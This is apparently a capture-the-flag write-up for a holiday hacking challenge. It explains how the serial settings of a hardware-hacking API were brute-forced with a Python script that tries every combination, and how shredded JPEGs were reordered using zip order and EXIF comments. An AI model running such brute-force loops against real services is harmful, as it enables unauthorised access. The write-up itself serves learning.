    Bruteforce Method⚓︎

    The challenge involves wiring up the Santa Little Helper Access Card Maintenance Tool to get access to it via serial console, which is connected to a terminal via USB. We need to connect the wires to the correct terminals, set the Voltage to 3V and then discover the serial settings to use. The physical connectivity is quite straight forward, just connect RX to TX, TX to RX, VCC to V(Volt) and GND to G(Ground). The trouble is finding the serial settings, which I guess could be done manually by trial and error, but I wasn't going to take that approach. Looking at the Network Tab in the browser Development Tools, I could see the request being sent to the API which was the following:

    {requestID: "50a92e5e-8ee3-4f27-9e99-bb341751efa0", serial: [0, 0, 0, 0, 0, 0], voltage: 3}

    The response to this was False. I thought that we could bruteforce this so I asked Chatty to build a script to do just that. While looking at the page source code further, I was able to see the following comment:

    Source Code Comment

    // Word on the wire is that some resourceful elves managed to brute-force their way in through the v1 API.
// We have since updated the API to v2 and v1 "should" be removed by now.// Build the URL with the request ID 
// const url = new URL(`${window.location.protocol}//${window.location.hostname}:${window.location.port}/api/v1/complete`);
const url = new URL(`${window.location.protocol}//${window.location.hostname}:${window.location.port}/api/v2/complete`);

    I started the bruteforce script against api v2 first, which eventually returned "True". I also ran it a second time against v1. In both cases, it worked!

    Request was successful with serial: (3, 9, 2, 2, 0, 3)

    Shreds Method⚓︎

    Besides the UV Flashlight and the Frosty Book which we picked up earlier in the challenges, we were also rewarded the shreds of an important file. Uncompressing this file reveals a large number of small JPEG files, wall named with a unique ID. The challenge provides a tip that if we use the heuristic edge detection script, we should be able to identify the order of these files to stitch them back together. But, in the process of my investigation, I identified that the JPEG files where compressed in the order they were shreded. One can see this using a tool like zipnote or zipinfo against the shreds. This could be tested using the EXIF tool against each of these files in the order identified by these tools, to reveal a base64 comment, that when decoded, returns an array of 2 string, the first whcih liiks like some encoding string, which I have not figured out what it is (so far), while the second array contained groups of 2 or 3 ASCII character. I asked Chatty to come up with a script that gets the order from the shreds file itself, and then run EXIF on each, decode the base64, and combine the ASCII String. This is the story we descoverd:

    import requests
import json
import itertools

def send_post_request():
    url = "https://hhc24-hardwarehacking.holidayhackchallenge.com/api/v2/complete"
    headers = {
        "Content-Type": "application/json"
    }

    # Define ranges for serial values
    serial_ranges = [
        range(0, 4),  # 0-3
        range(0, 10), # 0-9
        range(0, 3),  # 0-2
        range(0, 4),  # 0-3
        range(0, 2),  # 0-1
        range(0, 4)   # 0-3
    ]

    # Create all combinations of serial values using itertools.product
    for serial in itertools.product(*serial_ranges):
        data = {
            "requestID": "22fc5930-1882-4069-8079-e365c9a93547",
            "serial": list(serial),
            "voltage": 3
        }

        try:
            response = requests.post(url, headers=headers, data=json.dumps(data))

            # Handle the response
            if response.status_code == 200:
                response_json = response.json()
                if response_json is not False:
                    print("Request was successful with serial:", serial)
                    print("Response:", response_json)
                    break
                else:
                    print("Attempt with serial", serial, "returned False")
            else:
                print(f"Failed with status code {response.status_code}: {response.text}")
        except requests.exceptions.RequestException as e:
            print("An error occurred:", e)

if __name__ == "__main__":
    send_post_request()

    import os
import zipfile
import base64
import subprocess
import ast

# Path to your files
zip_file = "./shreds.zip"

# Get the list of files in the ZIP file, in the exact order they were compressed
def get_zip_file_list(zip_file):
    with zipfile.ZipFile(zip_file, 'r') as zip_ref:
        return zip_ref.namelist()

# Extract the "User Comment" field from an image using exiftool
# The "User Comment" is base64 encoded, so we need to decode it
# Returns the decoded user comment
def get_user_comment(file_path):
    try:
        # Run exiftool to get the User Comment field
        result = subprocess.run([
            "exiftool", "-UserComment", file_path
        ], capture_output=True, text=True)

        if result.returncode == 0:
            output = result.stdout
            # Find the line containing "User Comment"
            for line in output.splitlines():
                if "User Comment" in line:
                    # Extract the value after the colon
                    comment = line.split(":", 1)[-1].strip()
                    # Base64 decode the comment
                    decoded_comment = base64.b64decode(comment).decode('utf-8')
                    print(f"Decoded User Comment for {file_path}: {decoded_comment}")
                    return decoded_comment
    except Exception as e:
        print(f"Error extracting User Comment from {file_path}: {e}")
    return ""


def main():
    # Get the list of files from the zip archive
    file_list = get_zip_file_list(zip_file)

    # Initialize empty strings to collect the "cryptic" and "story" parts
    cryptic_result = ""
    story_result = ""

    for file_name in file_list:
        # Skip files that are not .jpg
        if not file_name.lower().endswith(".jpg"):
            continue

        # The file path is already correct as per the zip structure
        file_path = file_name
        if os.path.exists(file_path):
            print(f"Processing file: {file_path}")
            # Extract the user comment, decode it
            decoded_comment = get_user_comment(file_path)
            if decoded_comment:
                try:
                    # Convert the decoded comment string to a list
                    comment_list = ast.literal_eval(decoded_comment)
                    if isinstance(comment_list, list) and len(comment_list) == 2:
                        cryptic_result += comment_list[0]
                        story_result += comment_list[1]
                    else:
                        print(f"Unexpected format for decoded comment in {file_path}: {decoded_comment}")
                except Exception as e:
                    print(f"Error parsing decoded comment for {file_path}: {e}")
        else:
            print(f"File {file_path} does not exist in extracted slices folder.")

    # Print the final concatenated results
    print("Final Cryptic Result:")
    print(cryptic_result)
    print("\nFinal Story Result:")
    print(story_result)


if __name__ == "__main__":
    main()

    import os
import zipfile
from PIL import Image

# Path to your files
zip_file = "./shreds.zip"
output_file = "./combined_output.jpg"

# Get the list of files in the ZIP file, in the exact order they were compressed
def get_zip_file_list(zip_file):
    with zipfile.ZipFile(zip_file, 'r') as zip_ref:
        return zip_ref.namelist()

def concatenate_images(image_paths):
    images = [Image.open(image_path) for image_path in image_paths]

    # Assuming all images are the same size, get dimensions
    widths, heights = zip(*(i.size for i in images))
    total_width = sum(widths)
    max_height = max(heights)

    # Create a new blank image with the correct total width and max height
    combined_image = Image.new('RGB', (total_width, max_height))

    # Paste each image side by side
    x_offset = 0
    for im in images:
        combined_image.paste(im, (x_offset, 0))
        x_offset += im.size[0]

    return combined_image

def main():
    # Get the list of files from the zip archive
    file_list = get_zip_file_list(zip_file)

    # Filter out non-jpg files
    jpg_files = [file_name for file_name in file_list if file_name.lower().endswith(".jpg")]

    # Extract jpg files from the zip archive
    extracted_paths = []
    with zipfile.ZipFile(zip_file, 'r') as zip_ref:
        for file_name in jpg_files:
            extracted_path = zip_ref.extract(file_name)
            extracted_paths.append(extracted_path)

    # Concatenate images
    if extracted_paths:
        combined_image = concatenate_images(extracted_paths)
        combined_image.save(output_file)
        print(f"Combined image saved as {output_file}")
    else:
        print("No JPG files found in the ZIP archive.")

if __name__ == "__main__":
    main()
